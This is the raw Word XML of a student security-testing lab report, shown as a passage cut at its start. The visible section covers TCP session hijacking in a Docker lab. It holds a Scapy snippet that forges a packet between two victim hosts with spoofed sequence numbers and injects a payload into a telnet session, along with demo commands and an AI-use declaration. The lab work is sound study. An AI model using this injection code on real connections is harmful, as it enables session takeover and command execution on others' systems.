          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="247D916B" w14:textId="77777777" w:rsidR="003E07ED" w:rsidRPr="00C2328F" w:rsidRDefault="003E07ED" w:rsidP="003E07ED">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t># Forge packet from A → B with the command</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00408B12" w14:textId="77777777" w:rsidR="003E07ED" w:rsidRPr="00C2328F" w:rsidRDefault="003E07ED" w:rsidP="003E07ED">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> = IP(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>src</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">=VICTIM_A, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>dst</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>=VICTIM_B)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4723D2CF" w14:textId="77777777" w:rsidR="003E07ED" w:rsidRPr="00C2328F" w:rsidRDefault="003E07ED" w:rsidP="003E07ED">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> = TCP(sport=sport, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>dport</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>=</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>dport</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, flags="PA", seq=seq, ack=ack)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="445B1B8D" w14:textId="77777777" w:rsidR="003E07ED" w:rsidRPr="00C2328F" w:rsidRDefault="003E07ED" w:rsidP="003E07ED">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">pkt = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> / </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> / payload</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="763CDBF7" w14:textId="77777777" w:rsidR="003E07ED" w:rsidRPr="00C2328F" w:rsidRDefault="003E07ED" w:rsidP="003E07ED">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="17CF9A94" w14:textId="77777777" w:rsidR="003E07ED" w:rsidRPr="00C2328F" w:rsidRDefault="003E07ED" w:rsidP="003E07ED">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t># Send the fake command</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1269DF62" w14:textId="77777777" w:rsidR="003E07ED" w:rsidRPr="00C2328F" w:rsidRDefault="003E07ED" w:rsidP="003E07ED">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">send(pkt, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>iface</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>=IFACE)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02AB6E40" w14:textId="77777777" w:rsidR="003E07ED" w:rsidRPr="00C2328F" w:rsidRDefault="003E07ED" w:rsidP="003E07ED">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="773CB0BB" w14:textId="05B130D8" w:rsidR="003E07ED" w:rsidRPr="00C2328F" w:rsidRDefault="003E07ED" w:rsidP="003E07ED">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>print("</w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>📤</w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Injected payload to hijack telnet session.")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45401716" w14:textId="77777777" w:rsidR="003E07ED" w:rsidRPr="00C2328F" w:rsidRDefault="003E07ED" w:rsidP="003E07ED">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="39A8CD66" w14:textId="2B3CAE14" w:rsidR="003E07ED" w:rsidRPr="00C2328F" w:rsidRDefault="003E07ED" w:rsidP="003E07ED">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>When we run the demo, use this command like in the previous question on host terminal to make a connection:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A8A860D" w14:textId="2763C5D2" w:rsidR="003E07ED" w:rsidRPr="00C2328F" w:rsidRDefault="003E07ED" w:rsidP="003E07ED">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>docker exec -it victim-10.9.0.5 bash</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ECF7D50" w14:textId="1F456908" w:rsidR="003E07ED" w:rsidRPr="00C2328F" w:rsidRDefault="003E07ED" w:rsidP="003E07ED">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>telnet 10.9.0.6</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79F94A7D" w14:textId="11B09C53" w:rsidR="003E07ED" w:rsidRPr="00C2328F" w:rsidRDefault="003E07ED" w:rsidP="003E07ED">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Then run the script and it should inject the file we wanted: </w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>python3 hijack_telnet.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32D4DC87" w14:textId="7A269FAB" w:rsidR="000A2534" w:rsidRPr="00C2328F" w:rsidRDefault="000A2534" w:rsidP="003E07ED">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>On the host terminal after login try to run:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73D3236E" w14:textId="77777777" w:rsidR="000A2534" w:rsidRPr="00C2328F" w:rsidRDefault="000A2534" w:rsidP="000A2534">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>ls</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CC8C4AB" w14:textId="73A0BE4A" w:rsidR="000A2534" w:rsidRPr="00C2328F" w:rsidRDefault="000A2534" w:rsidP="000A2534">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>cat s3893964.txt</w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
        <w:t>This is to see the hijack files.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76062830" w14:textId="549609F4" w:rsidR="00C2328F" w:rsidRPr="00C2328F" w:rsidRDefault="00C2328F" w:rsidP="000A2534">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1B08AEF5" wp14:editId="2F95DA2D">
            <wp:extent cx="5486400" cy="1527810"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="13235237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23768" name="Picture 1" descr="A screenshot of a computer&#10;&#10;AI-generated content may be incorrect."/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId25"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5486400" cy="1527810"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EC9A031" w14:textId="2FFFF38B" w:rsidR="00C2328F" w:rsidRPr="00C2328F" w:rsidRDefault="00C2328F" w:rsidP="000A2534">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Fig18: The script hijack telnet session and inject the text file. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="604F66F3" w14:textId="3A89275F" w:rsidR="00C2328F" w:rsidRPr="00C2328F" w:rsidRDefault="00C2328F" w:rsidP="00C2328F">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Appendix:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4606D587" w14:textId="517A85E7" w:rsidR="00C2328F" w:rsidRPr="00C2328F" w:rsidRDefault="00C2328F" w:rsidP="00C2328F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">AI Declaration: For all the code generated in this assignment including some ideas for section 3 and 4 are from ChatGPT 4.0. The prompt that I use to ask this AI model is the assignment pdf where I tell it to write me a simple script and give me the outline for these 2 sections. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50D4B041" w14:textId="77777777" w:rsidR="00C2328F" w:rsidRPr="00C2328F" w:rsidRDefault="00C2328F" w:rsidP="00C2328F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6FB6CFCC" w14:textId="77777777" w:rsidR="00C2328F" w:rsidRPr="00C2328F" w:rsidRDefault="00C2328F" w:rsidP="000A2534">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:sectPr w:rsidR="00C2328F" w:rsidRPr="00C2328F" w:rsidSect="00034616">
      <w:footerReference w:type="default" r:id="rId2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12E8D" w14:textId="77777777" w:rsidR="00BE135D" w:rsidRDefault="00BE135D">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="592F5E47" w14:textId="77777777" w:rsidR="00BE135D" w:rsidRDefault="00BE1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E6E60" w14:textId="77777777" w:rsidR="000A5841" w:rsidRDefault="00000000">
    <w:pPr>
      <w:pStyle w:val="Footer"/>
      <w:jc w:val="center"/>
    </w:pPr>
    <w:r>
      <w:t>INTE2580/77 Security Testing Assignment 1 - Le Phuc Thinh s3893964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C7081" w14:textId="77777777" w:rsidR="00BE135D" w:rsidRDefault="00BE135D">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="53681E11" w14:textId="77777777" w:rsidR="00BE135D" w:rsidRDefault="00BE13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551E52"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="F15613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F457C3"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="3CFE4E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BA1E1F"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="35123C3A"/>
    <w:lvl w:ilvl="0" w:tplc="0409000F">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="103E5A50">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5E25725A"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="79D0A1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8561674">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="939416618">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="1852866517">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="90008788">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="276985626">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="1924559624">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="797114449">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="1241405127">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="923614279">
    <w:abstractNumId w:val="0"/>
  </w:num>
  <w:num w:numId="10" w16cid:durableId="1074930107">
    <w:abstractNumId w:val="11"/>
  </w:num>
  <w:num w:numId="11" w16cid:durableId="1458259144">
    <w:abstractNumId w:val="12"/>
  </w:num>
  <w:num w:numId="12" w16cid:durableId="442772337">
    <w:abstractNumId w:val="9"/>
  </w:num>
  <w:num w:numId="13" w16cid:durableId="17703472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888"/>
    <w:rsid w:val="00007C39"/>
    <w:rsid w:val="00034616"/>
    <w:rsid w:val="0006063C"/>
    <w:rsid w:val="000A2534"/>
    <w:rsid w:val="000A5841"/>
    <w:rsid w:val="000A7E7F"/>
    <w:rsid w:val="000B681D"/>
    <w:rsid w:val="000E1A29"/>
    <w:rsid w:val="0015074B"/>
    <w:rsid w:val="0018692A"/>
    <w:rsid w:val="001D0661"/>
    <w:rsid w:val="002613AA"/>
    <w:rsid w:val="0029639D"/>
    <w:rsid w:val="00326F90"/>
    <w:rsid w:val="00365985"/>
    <w:rsid w:val="00387AE2"/>
    <w:rsid w:val="003E07ED"/>
    <w:rsid w:val="004006EE"/>
    <w:rsid w:val="00416C1F"/>
    <w:rsid w:val="004929E4"/>
    <w:rsid w:val="004C5FAB"/>
    <w:rsid w:val="00545DEF"/>
    <w:rsid w:val="005A6090"/>
    <w:rsid w:val="00642ED1"/>
    <w:rsid w:val="00664A36"/>
    <w:rsid w:val="00722930"/>
    <w:rsid w:val="0075765F"/>
    <w:rsid w:val="00761F66"/>
    <w:rsid w:val="007D490B"/>
    <w:rsid w:val="007E4A5D"/>
    <w:rsid w:val="00811D89"/>
    <w:rsid w:val="00863FF2"/>
    <w:rsid w:val="008B3620"/>
    <w:rsid w:val="008F333D"/>
    <w:rsid w:val="00A07246"/>
    <w:rsid w:val="00A81C71"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00B40568"/>
    <w:rsid w:val="00B4522F"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00BE135D"/>
    <w:rsid w:val="00C1207A"/>
    <w:rsid w:val="00C2328F"/>
    <w:rsid w:val="00C74EFE"/>
    <w:rsid w:val="00C77F37"/>
    <w:rsid w:val="00CB0664"/>
    <w:rsid w:val="00D04C28"/>
    <w:rsid w:val="00D505CB"/>
    <w:rsid w:val="00D825BB"/>
    <w:rsid w:val="00E315B7"/>
    <w:rsid w:val="00F40BED"/>
    <w:rsid w:val="00F655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F5C96E"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{9344F74D-5694-4CE1-B564-936CF706D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615</TotalTime>
  <Pages>19</Pages>
  <Words>2388</Words>
  <Characters>13613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Thinh Le Phuc</cp:lastModifiedBy>
  <cp:revision>7</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2013-12-23T23:15:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-08-03T12:13:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>